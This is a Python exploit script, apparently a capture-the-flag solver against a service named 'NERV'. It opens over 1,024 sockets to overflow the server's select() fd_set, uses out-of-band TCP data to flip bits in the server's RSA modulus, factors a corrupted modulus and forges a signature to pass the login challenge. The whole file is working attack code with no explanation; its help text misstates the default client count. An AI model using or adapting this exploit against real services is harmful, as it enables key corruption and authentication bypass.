#!/usr/bin/env python3

import argparse
import socket
import sys
import resource
from pwn import *
from ssh_pubkey import parse_key
from composite_key import CompositeAttack, rootpath
import subprocess

RED = '\033[91m'
RESET = '\033[0m'
def compare_keys(n1, n2, name1, name2, keysize=128, limit=-1):
    bs1 = f'{n1:0{keysize*2}x}'
    bs2 = f'{n2:0{keysize*2}x}'
    bs1 = bs1[:limit]
    bs2 = bs2[:limit]
    print(f'{name1}: ', end='')
    for c1,c2 in zip(bs1, bs2):
        if c1 != c2: print(RED + c1 + RESET, end='')
        else: print(c1, end='')
    print()
    print(f'{name2}: ', end='')
    for c1,c2 in zip(bs1, bs2):
        if c1 != c2: print(RED + c2 + RESET, end='')
        else: print(c2, end='')
    print()

def sign(n, e, d, m):
    signing_bin = '%s/signmessage' % rootpath()
    cmd = [signing_bin, str(n), str(e), str(d), str(m)]
    sig = subprocess.check_output(cmd, text=True)
    return sig.strip()

def find_all(a_str, sub):
    matches = []
    start = 0
    while True:
        start = a_str.find(sub, start)
        if start == -1: return matches
        matches.append(start)
        start += len(sub) # use start += 1 to find overlapping matches

def increase_open_files_limit():
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Soft limit: {soft}, Hard limit: {hard}")
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Soft limit: {soft}, Hard limit: {hard}")

def make_connections(host, port, num_clients):
    # Create TCP/IP sockets and connect
    sockets = []
    for i in range(num_clients):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sockets.append(sock)
            print(".", end='', flush=True)
        except socket.timeout:
            print(f"\n[{i+1}] Timeout connecting to {host}:{port}")
            break
        except Exception as e:
            print(f"\n[{i+1}] Error connecting to {host}:{port}: {e}")
            break
        except KeyboardInterrupt:
            print(f"\n[{i+1}] Interrupted", file=sys.stderr)
            break
    return sockets

def oob_corrupt(sockets, i):
    sockets[i].send(b'1', socket.MSG_OOB)

def solve(args):
    # Connect to the server on the main port
    r = remote(args.host, args.port)
    intro_text = r.readuntil(b'Your public key is:\n')
    print(intro_text.decode('utf-8'), end='')
    # Read the public key
    initial_key = r.readline().decode('utf-8').strip()
    print(initial_key)
    # Parse the public key
    _, exponent, initial_modulus = parse_key(initial_key)
    print(f"Exponent: {exponent}")
    print(f"Modulus: {initial_modulus}")
    # Read the port number
    port_text = r.readline().decode('utf-8').strip()
    print(port_text)
    client_port = int(port_text.split()[-1])
    # Read the menu
    menu = r.readuntil(b'Enter your choice: ')
    print(menu.decode('utf-8'), end='')
    sockets = make_connections(args.host, client_port, args.num_clients)
    print(f"\nConnected {len(sockets)} clients")

    # The server uses fds 0-6 internally and FD_SETSIZE is 1024
    # So the bits we control are len(sockets) - 1024 + 7
    controlled_bits = len(sockets) - 1024 + 7
    print(f"Controlled bits: {controlled_bits}")

    overflow_sockets = sockets[-controlled_bits:]


    # Corrupt the last socket bit and then read the public key a few times in a row to see if it changes
    current_modulus = initial_modulus
    oob_corrupt(sockets, -1)
    for i in range(10):
        # Read the menu and ask for the public key
        r.sendline(b'2')
        r.readuntil(b'Your public key is:\n')
        new_key = r.readline().decode('utf-8').strip()
        r.readuntil(b'Enter your choice: ')
        # Parse the public key
        _, _, modulus = parse_key(new_key)
        if modulus == current_modulus:
            continue
        print(f"After round {i}:")
        compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
        current_modulus = modulus

    factored = False
    i = 0
    while not factored:
        i -= 1
        # Flip a coin to decide if we corrupt this bit
        # if random.randint(0, 1) == 0:
        #     continue
        oob_corrupt(sockets, i)
        # Read the menu and ask for the public key
        r.sendline(b'2')
        r.readuntil(b'Your public key is:\n')
        new_key = r.readline().decode('utf-8').strip()
        r.readuntil(b'Enter your choice: ')
        # Parse the public key
        key_type, exponent, modulus = parse_key(new_key)
        # If we didn't get a new modulus, try again
        if modulus == current_modulus:
            continue
        # Compare the moduli
        compare_keys(current_modulus, modulus, 'Old', 'New')
        current_modulus = modulus
        try:
            attack = CompositeAttack(timeout=60)
            key = attack.attack(modulus, exponent)
            if key:
                print(key)
                factored = True
                break
        except TimeoutError as exc:
            print(f"Timeout while trying to factor: {exc}")
            continue
        except Exception as exc:
            print(f"Error while trying to factor: {exc}")
            continue
    # Authenticate
    r.sendline(b'1')
    chal = r.recvline_startswith(b'Challenge: ')
    challenge = chal.decode().strip().split()[-1]
    print(f"Got challenge: {challenge}, signing with forged key")
    forged_sig = sign(key.n, exponent, key.d, challenge)
    print(f"Got forged signature: {forged_sig}")
    r.readuntil(b'Response: ')
    r.sendline(forged_sig.encode())
    # Read until menu
    result = r.readuntil(b'Enter your choice: ')
    print(result.decode('utf-8'))

    r.close()
    for s in sockets:
        s.close()

def main():
    parser = argparse.ArgumentParser(description='NERV Client')
    parser.add_argument('host', default='localhost', nargs='?', help='IP or hostname')
    parser.add_argument('-p', '--port', metavar='port', type=int, default=2000,
                        help='TCP port (default 2000)')
    parser.add_argument('-n', '--num_clients', metavar='num_clients', type=int, default=1050,
                        help='Number of clients (default 32)')
    args = parser.parse_args()

    increase_open_files_limit()
    solve(args)

if __name__ == '__main__':
    main()

